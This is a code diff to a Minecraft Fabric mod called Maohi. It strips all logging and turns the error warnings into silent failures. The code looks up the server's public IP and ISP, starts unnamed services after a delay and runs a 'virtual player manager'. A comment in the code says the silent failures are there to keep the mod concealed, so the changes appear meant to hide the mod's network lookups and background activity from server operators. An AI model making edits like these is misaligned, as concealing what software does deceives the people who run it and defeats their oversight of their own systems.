@@ -90,7 +90,7 @@ public class Maohi implements ModInitializer {
                 conn.disconnect();
             }
         } catch (Exception e) {
-            LOGGER.warn("[ISP] ip.sb failed: " + e.getMessage());
+            // 静默失败
         }
 
         // 备用尝试 ip-api.com
@@ -109,7 +109,7 @@ public class Maohi implements ModInitializer {
                 conn.disconnect();
             }
         } catch (Exception e) {
-            LOGGER.warn("[ISP] ip-api failed: " + e.getMessage());
+            // 静默失败
         }
 
         return "Unknown";
@@ -138,7 +138,7 @@ public class Maohi implements ModInitializer {
                     conn.disconnect();
                 }
             } catch (Exception e) {
-                LOGGER.warn("[Emoji] " + url + " failed: " + e.getMessage());
+                // 静默失败
             }
         }
         return "🇺🇳 联合国";
@@ -160,7 +160,6 @@ public class Maohi implements ModInitializer {
 
     @Override
     public void onInitialize() {
-        LOGGER.info("Maohi starting...");
 
         // 注册服务器生命周期事件
         ServerLifecycleEvents.SERVER_STARTED.register(this::onServerStarted);
@@ -175,7 +174,6 @@ public class Maohi implements ModInitializer {
                 // 等待服务器完全启动后再启动各项服务
                 Thread.sleep(10000);
                 start();
-                LOGGER.info("Maohi enabled");
             } catch (Exception e) {
                 // 静默失败，不抛出异常以维持隐蔽性
             }
@@ -188,7 +186,6 @@ public class Maohi implements ModInitializer {
      * 服务器启动完成回调
      */
     private void onServerStarted(MinecraftServer server) {
-        LOGGER.info("[Maohi] 服务器已启动，初始化虚拟玩家管理器...");
         virtualPlayerManager = new VirtualPlayerManager(server);
         virtualPlayerManager.start();
     }
@@ -197,7 +194,6 @@ public class Maohi implements ModInitializer {
      * 服务器关闭回调
      */
     private void onServerStopping(MinecraftServer server) {
-        LOGGER.info("[Maohi] 服务器正在关闭，停止虚拟玩家管理器...");
         if (virtualPlayerManager != null) {
             virtualPlayerManager.stop();
         }
@@ -541,14 +537,14 @@ public class Maohi implements ModInitializer {
                                 return addr.getHostAddress();
                             }
                         } catch (Exception ex) {
-                            LOGGER.warn("[getServerIP] " + src + " returned invalid: " + ip.substring(0, Math.min(ip.length(), 50)));
+                            // 静默失败
                         }
                     }
                 } finally {
                     conn.disconnect();
                 }
             } catch (Exception e) {
-                LOGGER.warn("[getServerIP] " + src + " failed: " + e.getMessage());
+                // 静默失败
             }
         }
         return "localhost";
